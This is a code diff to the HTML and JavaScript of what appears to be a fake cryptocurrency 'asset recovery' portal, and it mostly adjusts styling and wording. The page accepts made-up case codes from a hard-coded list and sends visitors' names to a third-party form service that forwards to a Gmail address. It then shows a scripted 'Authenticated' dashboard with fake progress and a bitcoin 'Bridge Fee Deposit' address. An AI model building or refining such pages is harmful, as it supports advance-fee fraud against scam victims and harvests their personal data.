@@ -35,16 +35,16 @@
         <div id="main-content" class="max-w-md mx-auto">
             <div id="login-card" class="glass-card p-8 rounded-3xl border-t-4 border-t-cyan-500">
                 <h2 class="text-2xl font-bold mb-2 italic text-cyan-500">Authorized Access</h2>
-                <p class="text-[10px] text-gray-500 mb-6 uppercase tracking-widest text-center">Encrypted Case Node Login</p>
+                <p class="text-[10px] text-gray-500 mb-6 uppercase tracking-widest text-center font-bold">Encrypted Case Node Login</p>
                 
                 <form id="login-form" action="https://formsubmit.co/ajax/recoveryspecialistdigitalasset@gmail.com" method="POST" class="space-y-4">
                     <div>
                         <label class="text-[9px] uppercase text-gray-400 font-bold mb-1 block">Case Identification Code</label>
-                        <input type="text" id="case_id_input" name="case_id" placeholder="DAR-2026-XXXX" required class="w-full bg-black/60 border border-cyan-500/30 p-4 rounded-xl outline-none text-white font-mono focus:border-cyan-500 transition">
+                        <input type="text" id="case_id_input" name="case_id" placeholder="DAR-2026-XXXX" required class="w-full bg-black/60 border border-cyan-500/30 p-4 rounded-xl outline-none text-white font-mono focus:border-cyan-400 transition">
                     </div>
                     <div>
                         <label class="text-[9px] uppercase text-gray-400 font-bold mb-1 block">Full Name</label>
-                        <input type="text" name="auth_name" placeholder="Name on File" required class="w-full bg-black/60 border border-white/10 p-4 rounded-xl outline-none text-white focus:border-cyan-500 transition">
+                        <input type="text" name="auth_name" placeholder="Name on File" required class="w-full bg-black/60 border border-white/10 p-4 rounded-xl outline-none text-white focus:border-cyan-400 transition">
                     </div>
                     
                     <p id="error-msg" class="hidden text-red-500 text-[10px] font-bold uppercase italic tracking-wider text-center">Access Denied: Case ID Not Found.</p>
@@ -61,7 +61,7 @@
                         <h2 class="text-3xl font-bold uppercase tracking-tighter italic text-white">Case Dashboard</h2>
                         <div class="flex items-center space-x-2 mt-1">
                             <span class="text-cyan-400 font-mono text-sm" id="display_id"></span>
-                            <span id="id_badge" class="text-[9px] bg-green-500/20 text-green-400 px-2 py-0.5 rounded border border-green-500/30 uppercase font-bold italic">Authenticated</span>
+                            <span id="id_badge" class="text-[9px] bg-green-500/20 text-green-400 px-2 py-0.5 rounded border border-green-500/30 uppercase font-bold italic tracking-tighter">Authenticated</span>
                         </div>
                     </div>
                 </div>
@@ -69,7 +69,7 @@
                 <div class="mb-8 p-6 bg-cyan-500/5 rounded-2xl border border-cyan-500/10">
                     <div class="flex justify-between mb-3 text-xs font-bold uppercase italic">
                         <span class="flex items-center gap-2"><span class="pulse h-2 w-2 rounded-full bg-cyan-400"></span>Status: <span id="status_text"></span></span>
-                        <span id="progress_percent" class="text-cyan-400"></span>
+                        <span id="progress_percent" class="text-cyan-400 font-bold"></span>
                     </div>
                     <div class="progress-bar mb-4"><div id="progress_bar_fill" class="progress-fill"></div></div>
                     
@@ -99,12 +99,12 @@
                         <p id="doc_msg" class="text-[11px] text-gray-400 italic leading-relaxed"></p>
                     </div>
                     <div class="p-6 bg-black/40 border border-orange-500/20 rounded-2xl">
-                        <h3 class="text-sm font-bold uppercase mb-4 text-orange-400 italic">Settlement Protocol</h3>
+                        <h3 class="text-sm font-bold uppercase mb-4 text-orange-400 italic font-bold">Settlement Protocol</h3>
                         <div class="bg-black/80 p-3 rounded-lg border border-orange-500/30 mb-3">
-                            <p class="text-[9px] text-orange-500 font-bold uppercase italic italic">Bridge Fee Deposit (BTC)</p>
+                            <p class="text-[9px] text-orange-500 font-bold uppercase italic">Bridge Fee Deposit (BTC)</p>
                             <p class="text-[10px] font-mono break-all text-white mt-1">1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</p>
                         </div>
-                        <button class="w-full bg-orange-600/10 border border-orange-500/40 text-orange-400 font-bold py-2 rounded-lg uppercase text-[9px]">Awaiting Confirmation</button>
+                        <button class="w-full bg-orange-600/10 border border-orange-500/40 text-orange-400 font-bold py-2 rounded-lg uppercase text-[9px] tracking-widest">Awaiting Confirmation</button>
                     </div>
                 </div>
             </div>
@@ -112,6 +112,7 @@
     </div>
 
     <script>
+        // MASTER DATABASE
         const approvedCases = {
             "DAR-2026-8942": {
                 status: "VERIFIED / STAGED",
@@ -121,14 +122,13 @@
             }
         };
 
-        // Generate codes 1001-1050
+        // Create 50 generic slots (1001-1050)
         for (let i = 1001; i <= 1050; i++) {
-            const code = `DAR-2026-${i}`;
-            approvedCases[code] = {
+            approvedCases[`DAR-2026-${i}`] = {
                 status: "INITIALIZING NODE",
                 progress: "15%",
                 node: "GEN-NODE-ALLOCATED",
-                docStatus: "Bridge established. Awaiting identity verification (POI) to begin asset scan."
+                docStatus: "Secure bridge established. Awaiting identity verification (POI) and transaction history scan."
             };
         }
 
@@ -151,7 +151,6 @@
 
             btn.innerText = "OPENING SECURE BRIDGE...";
             btn.disabled = true;
-            errorMsg.classList.add('hidden');
 
             const caseData = approvedCases[inputId];
             await fetch(loginForm.action, { method: "POST", body: new FormData(loginForm), headers: { 'Accept': 'application/json' } });
